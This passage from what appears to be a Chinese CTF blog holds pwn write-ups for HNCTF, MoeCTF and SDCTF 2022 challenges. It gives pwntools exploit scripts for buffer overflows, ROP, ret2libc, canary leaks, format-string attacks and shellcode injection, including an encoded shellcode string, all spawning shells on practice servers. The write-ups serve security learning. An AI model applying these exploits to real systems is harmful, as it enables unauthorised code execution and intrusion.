<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28487</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input something\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span> +<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezcmp">ezcmp</span></h2><p>分析一下代码，发现 <code>buff</code> 被加密了，只需绕过这个 <code>if</code> 语句，就可以执行 <code>binsh</code> 了，问题是怎么绕过呢？gdb 调试来告诉你。</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
<p> 打断点，到enccrypt,通过调试可以发现被加密buff的地址，在观察其内容，就可以解决问题了，exp如下：</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28776</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x144678aadc0e4072</span>) + p64(<span class="number">0x84b6e81a4c7eb0e2</span>) + p64(<span class="number">0xf426588abcee2052</span>) + p64(<span class="number">0x0000c8cb2c5e90c2</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezr0p32">ezr0p32</span></h2><p>首先分析一下代码，可知出现了两个 <code>buf</code>，但是这两个 <code>buf</code> 的作用是不同的。第一个 <code>buf</code> 在 <code>.bss</code> 段，这样就可以把 <code>/bin/sh</code> 写进 <code>buf</code> 里面，然后执行 <code>system(&quot;/bin/sh&quot;)</code> 获得 flag。</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>这里也需要注意32位程序和64位程序的传参规则，此题位32位程序，是通过栈传递，所以payload的格式有所不同，system + 垃圾数据 + binsh，这些需要自己去做题总结发现，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28224</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x804A080</span></span><br><span class="line">system=<span class="number">0x80483D0</span></span><br><span class="line"><span class="comment">#system=elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please tell me your name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;now it&#x27;s your play time~&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">0x4</span>) +p32(system) +p32(<span class="number">0</span>) +p32(buf)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezr0p64">ezr0p64</span></h2><p>分析可知给出了 <code>puts</code> 地址，可以据此推算 libc 基址，构造 <code>system</code> 和 <code>/bin/sh</code>，套路比较明显，直接上exp</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
<p> 至于payload的构造格式，就要了解64位程序的传参方式，前六个参数是通过rdi, rsi, rdx, rcx, r8, r9, 这六个寄存器，后续的参数通过栈传递，记住格式就行</p>
<p>EXP 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28942</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4012a3</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span> +<span class="number">8</span>) +p64(ret_addr) +p64(rdi_addr) +p64(binsh) +p64(system)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Start your rop.&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="fmtstrre">fmtstrre</span></h2><p>明显存在格式字符串漏洞</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
<p>并发现偏移为 6</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/7.png"></p>
<p>gdb 调试，并注意 <code>.bss</code> 段 <code>name</code> 地址（存储了 flag），0x20 +6&#x3D;38，从而知道flag的位置</p>
<p><img src="/images/%5BHNCTF2022Week1%5DPWN%E5%A4%8D%E7%8E%B0/8.png"></p>
<blockquote>
<p>%x 以十六进制打印，只能打印4字节，一般只用于32位</p>
<p>%p 打印目标地址，建议32位和64位都用这个</p>
<p>%s 打印地址内容 %c 打印单个字符</p>
<p>%hhn 写一字节 %hn 写两字节</p>
<p>%n 写四字节</p>
<p>%ln 32位写四字节，64位写八字节</p>
<p>%lln 写八字节</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&#x27;./111&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28036</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your format string.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%38$s&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ret2shellcode">ret2shellcode</span></h2><p>经典的 shellcode 注入题，将 shellcode 写入 <code>.bss</code> 段：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28928</span>)</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">buff=<span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">payload=payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;A&#x27;</span>)+p64(buff)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="safe_shellcode">safe_shellcode</span></h2><p>这道题就难度，不太会，以后会了，再来改下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28840</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_64=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">payload=shellcode_64</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[HNCTF 2022 WEEK4] ezcanary 复现</title>
    <url>/%5BHNCTF%202022%20WEEK4%5D%20ezcanary%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HNCTF 2022 WEEK4] ezcanary 复现</p>
<span id="more"></span>

<h1><span id="ezcanary">ezcanary</span></h1><p>先查一下保护机制，打开 canary 和 NX，这个时候需要注意可以泄露 canary</p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>IDA 一下，看看伪代码，思路很清晰了，<code>printf</code> 造成了格式字符串漏洞和第二个 <code>read</code> 造成的溢出</p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>接下来就是想办法溢出 canary，并且泄露 libc，先运行一下程序，看看偏移吧（很容易发现偏移是六），接下来就是 gdb 调试，看看 canary 位置了，把断点打在 <code>printf</code></p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>显然 canary 就是第 51 个参数（这个你不会看不出来吧，评论区见），这样就可以得到 canary 的地址了，接下来就剩下泄露 libc 了，注意下面两个参数就是可以泄露的 libc 地址 <code>0x7ffff7db0d90</code>（注意不同代码的颜色），再从 <code>vmmap</code> 找到 libc，然后就可以算到偏移了，最后就可以得到 libc 的基址了（太裤辣）</p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/4.png"></p>
<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>后面就是正常的溢出了</p>
<h1><span id="exp">exp ：</span></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28441</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">rdi_addr = <span class="number">0x401323</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;%51$p.%53$p&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x110</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[MoeCTF 2022] PWN复现</title>
    <url>/%5BMoeCTF%202022%5D%20PWN%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[MoeCTF 2022] PWN复现</p>
<span id="more"></span>

<h2><span id="ret2text">ret2text</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>发生了明显的溢出，并且也发现了有后面函数，可以直接溢出，exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28287</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4014BA</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="ret2libc">ret2libc</span></h2><p>很传统的经典题型，利用puts泄露libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28546</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011A8</span></span><br><span class="line">rdi_addr = <span class="number">0x40117e</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="rop32">rop32</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
<p> 因为这里可以直接call system,并且还有binsh,直接构造就完事了，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28903</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = <span class="number">0x804C024</span></span><br><span class="line">sys_addr = <span class="number">0x80491E7</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x1c</span> + <span class="number">4</span>) + p32(sys_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="rop64">rop64</span></h2><p>因为保护机制开启了canary，所以首先要绕过，才好开展后续工作</p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
<p> 这里可以直接泄露canary的地址，并且canary &#x3D;0x28,后续就是经典的套路了 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node1.anna.nssctf.cn&quot;</span>, <span class="number">28912</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;Go Go Go!!!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4011de</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">system = <span class="number">0x401284</span></span><br><span class="line">binsh = <span class="number">0x404058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="filedes">filedes</span></h2><p>这题的知识点比较偏吧，文件的标准输出流</p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
<h2><span id="endian">endian</span></h2><p>这题因为<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E6%B1%87%E7%BC%96&spm=1001.2101.3001.7020">反汇编</a>里面说了需要输入两个整数，再加上小端序的缘故，所以要倒过来，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28598</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x616b694d</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">payload = <span class="number">0x424e6f74</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="border">border</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
<p> 再加上，要输出溢出的长度，求出两间的距离</p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/7.png"></p>
<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/8.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>, <span class="number">28780</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;length:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;32&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="buffer-overflow">buffer overflow</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/9.png"></p>
<p> 需要点逆向的能力，看代码，可知</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28309</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Write down your note:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">70</span> + <span class="string">b&#x27;Limiter and Wings are beautiful girls!\x00&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="babyfmt">babyfmt</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/10.png"></p>
<p> 已经告诉了后面函数，但是发生了格式<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>漏洞，可以通过运行程序找到偏移，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28931</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%10$s&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;printf_got: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="random">random</span></h2><p>这题就是随机数，时间做种子，来解决，这里我有点不明白接收一下 b&#39;a&#39;*0x20，没有看明白</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="number">28497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">p.sendafter(<span class="string">&quot;username: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;password: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">seed = u64(p.recvline(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line"></span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v8 = libc.rand()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me the number you guess now.\n&quot;</span>, <span class="built_in">str</span>(v8))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>MoeCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[SDCTF 2022]printFAILED 复现</title>
    <url>/%5BSDCTF%202022%5DprintFAILED%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[SDCTF 2022]printFAILED 复现</p>
<span id="more"></span>

<h1><span id="printfailed">printFAILED</span></h1><p>这是一道格式化字符串漏洞，出的比较特别，特别搜了下，跟大家分析一下</p>
<p>查看一下保护机制，发现按正常套路求不出偏移</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>再看看ida，发现里面有flag.txt，但是被scramble函数打乱了，需要我们guess，在printf那一行也出现了flag，我们可以尝试把flag的内容打印出来</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>nc一下，发现flag存在第四个参数（格式化字符串传参的规定，格式化字符串存放在rdi，因此printf函数会从rsi开始寻找参数），得到的这串代码是不是有点像flag了，有点那味了，接下来就可以看看scramble函数是怎么打乱flag</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/4.png"></p>
<hr>
<blockquote>
<h2><span id="scramble函数">scramble函数</span></h2><p>这段代码定义了一个名为 scramble 的函数，它接受一个整型参数 a1。该函数的作用是对全局变量 flag 中的前 a1 个字符进行递增。</p>
<p>在函数内部，首先定义了一个名为 i 的循环计数器变量。然后使用一个无限循环来遍历 flag 变量中的前 a1 个字符。在每次循环中，函数都会将 flag[i] 变量的值递增 1。</p>
<p>当循环计数器 i 的值大于等于 a1 时，循环结束，函数返回 i 的值。</p>
</blockquote>
<p>这里我知识有限，看不出这是什么加密的，别人用按位运算sub来解码，直接可以得到flag</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/5.png"></p>
<hr>
